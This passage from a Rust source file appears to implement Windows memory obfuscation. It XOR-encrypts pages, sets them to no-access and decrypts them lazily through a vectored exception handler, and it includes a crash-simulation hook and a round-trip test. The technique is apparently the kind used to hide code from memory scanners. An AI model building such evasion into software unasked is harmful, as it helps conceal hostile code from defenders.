    for b in slice.iter_mut() {
        *b ^= XOR_KEY;
    }
    // Restore the recorded original protection. In every real case orig_protect
    // is PAGE_READWRITE, so this is a no-op; even if an exotic restore failed
    // the page is usable plaintext, so we still report success (CONTINUE_
    // EXECUTION) — the faulting instruction re-executes on plaintext.
    if orig_protect != PAGE_READWRITE {
        let mut old = 0u32;
        VirtualProtect(page as *const c_void, PAGE_SIZE, orig_protect, &mut old);
    }
    (*e).state.store(PG_PLAINTEXT, Ordering::Release);
    true
}

unsafe fn register_veh() -> bool {
    // Idempotent: only the first caller actually registers (VEH_REGISTERED is
    // set once and never cleared — registration is process-lifetime).
    if VEH_REGISTERED.swap(true, Ordering::AcqRel) {
        return true;
    }
    let handle = AddVectoredExceptionHandler(1, Some(veh_handler));
    if handle.is_null() {
        VEH_REGISTERED.store(false, Ordering::Release);
        return false;
    }
    VEH_HANDLE.store(handle, Ordering::Release);
    true
}

// ---------------------------------------------------------------------------
// QA / Phase-4 test hook.
//
// `debug_simulate_crash_partial_decrypt(keep)` simulates a watchdog death in the
// middle of the bulk decrypt: it decrypts only the first `keep` encrypted pages
// (advancing `decrypt_cursor`) and deliberately leaves the remainder
// NOACCESS+encrypted, exactly as a mid-decrypt watchdog crash would. Phase-4 QA
// triggers this, then touches a still-encrypted page from a thread and asserts
// the VEH lazily decrypts it and execution continues.
// ---------------------------------------------------------------------------
#[cfg(any(test, feature = "print_debug"))]
#[allow(dead_code)]
pub fn debug_simulate_crash_partial_decrypt(keep: usize) {
    unsafe {
        let state = STATE.load(Ordering::Acquire);
        if state.is_null() {
            return;
        }
        partial_decrypt_cursor(state, keep);
    }
}

#[cfg(any(test, feature = "print_debug"))]
#[allow(dead_code)]
unsafe fn partial_decrypt_cursor(state: *mut State, keep: usize) {
    let n = (*state).count.load(Ordering::Acquire);
    let start = (*state).decrypt_cursor.load(Ordering::Acquire);
    if start >= n {
        return;
    }
    let limit = start + keep.min(n - start);
    let entries = (*state).entries;
    let mut i = start;
    while i < limit {
        let e = entries.add(i);
        // Skip pages not in the encrypted state (already decrypted by the VEH or
        // in flight); advancing the cursor past them keeps bulk-decrypt correct.
        let cur = (*e).state.load(Ordering::Acquire);
        if cur != PG_ENCRYPTED {
            (*state).decrypt_cursor.store(i + 1, Ordering::Release);
            i += 1;
            continue;
        }
        if (*e)
            .state
            .compare_exchange(PG_ENCRYPTED, PG_BUSY, Ordering::AcqRel, Ordering::Acquire)
            .is_err()
        {
            (*state).decrypt_cursor.store(i + 1, Ordering::Release);
            i += 1;
            continue;
        }
        let page = (*e).base;
        let orig = (*e).orig_protect;
        let mut old = 0u32;
        if VirtualProtect(page as *const c_void, PAGE_SIZE, PAGE_READWRITE, &mut old) == 0 {
            // Cannot make writable: leave encrypted and stop (simulated crash).
            (*e).state.store(PG_ENCRYPTED, Ordering::Release);
            (*state).decrypt_cursor.store(i, Ordering::Release);
            return;
        }
        // XOR to plaintext. Once XOR succeeds the page is plaintext regardless
        // of the (best-effort) orig restore, so record PG_PLAINTEXT immediately
        // to guarantee the later bulk-decrypt can never re-XOR it (#7).
        let slice = core::slice::from_raw_parts_mut(page, PAGE_SIZE);
        for b in slice.iter_mut() {
            *b ^= XOR_KEY;
        }
        (*e).state.store(PG_PLAINTEXT, Ordering::Release);
        if orig != PAGE_READWRITE {
            let mut old = 0u32;
            VirtualProtect(page as *const c_void, PAGE_SIZE, orig, &mut old);
        }
        (*state).decrypt_cursor.store(i + 1, Ordering::Release);
        i += 1;
    }
    // Leave [i..n) encrypted + NOACCESS, simulating the crash mid-pass.
    (*state).decrypt_cursor.store(i, Ordering::Release);
}

#[cfg(all(windows, feature = "mem-obfuscation", test))]
mod tests {
    use super::*;
    use windows_sys::Win32::System::Memory::{
        MEM_COMMIT, MEM_RESERVE, MEMORY_BASIC_INFORMATION, PAGE_NOACCESS, PAGE_READONLY,
        PAGE_READWRITE,
    };

    #[test]
    fn encrypt_decrypt_roundtrip() {
        // Serialize with the watchdog integration test which also creates the
        // process-wide MemGuard singleton.
        let _g = crate::memguard::TEST_LOCK.lock().unwrap();
        unsafe {
            let buf = VirtualAlloc(
                core::ptr::null(),
                PAGE_SIZE,
                MEM_COMMIT | MEM_RESERVE,
                PAGE_READWRITE,
            ) as *mut u8;
            assert!(!buf.is_null(), "VirtualAlloc failed");

            let mut pattern = [0u8; PAGE_SIZE];
            for (i, b) in pattern.iter_mut().enumerate() {
                *b = (i as u8).wrapping_add(1);
            }
            core::ptr::copy_nonoverlapping(pattern.as_ptr(), buf, PAGE_SIZE);

            let mut guard = MemGuard::new().expect("memguard init");

            // Singleton guard: a second concurrent instance must be refused
            // while one is already alive.
            assert!(
                MemGuard::new().is_none(),
                "second MemGuard::new() must return None while one is alive"
            );

            for cycle in 0..2 {
                assert!(guard.encrypt(), "encrypt failed (cycle {cycle})");

                let mut mbi = core::mem::MaybeUninit::<MEMORY_BASIC_INFORMATION>::uninit();
                let r = VirtualQuery(
                    buf as *const c_void,
                    mbi.as_mut_ptr(),
                    core::mem::size_of::<MEMORY_BASIC_INFORMATION>(),
                );
                assert!(r != 0, "VirtualQuery failed (cycle {cycle})");
                assert_eq!(
                    mbi.assume_init().Protect,
                    PAGE_NOACCESS,
                    "buffer should be NOACCESS after encrypt (cycle {cycle})"
                );

                let mut old = 0u32;
                assert!(
                    VirtualProtect(buf as *const c_void, PAGE_SIZE, PAGE_READONLY, &mut old) != 0,
                    "VirtualProtect RO failed (cycle {cycle})"
                );
                let mut enc = [0u8; PAGE_SIZE];
                core::ptr::copy_nonoverlapping(buf, enc.as_mut_ptr(), PAGE_SIZE);
                assert!(
                    VirtualProtect(buf as *const c_void, PAGE_SIZE, PAGE_NOACCESS, &mut old) != 0,
                    "VirtualProtect NA failed (cycle {cycle})"
                );

                for i in 0..PAGE_SIZE {
                    assert_eq!(
                        enc[i],
                        pattern[i] ^ XOR_KEY,
                        "byte {i} not XOR'd (cycle {cycle})"
                    );
                }

                assert!(guard.decrypt(), "decrypt failed (cycle {cycle})");

                let mut mbi = core::mem::MaybeUninit::<MEMORY_BASIC_INFORMATION>::uninit();
                let r = VirtualQuery(
                    buf as *const c_void,
                    mbi.as_mut_ptr(),
                    core::mem::size_of::<MEMORY_BASIC_INFORMATION>(),
                );
                assert!(r != 0, "VirtualQuery failed (cycle {cycle})");
                assert_eq!(
                    mbi.assume_init().Protect,
                    PAGE_READWRITE,
                    "buffer should be READWRITE after decrypt (cycle {cycle})"
                );

                let mut dec = [0u8; PAGE_SIZE];
                core::ptr::copy_nonoverlapping(buf, dec.as_mut_ptr(), PAGE_SIZE);
                for i in 0..PAGE_SIZE {
                    assert_eq!(dec[i], pattern[i], "byte {i} not restored (cycle {cycle})");
                }
            }

            VirtualFree(buf as *mut c_void, 0, MEM_RELEASE);
        }
    }
}
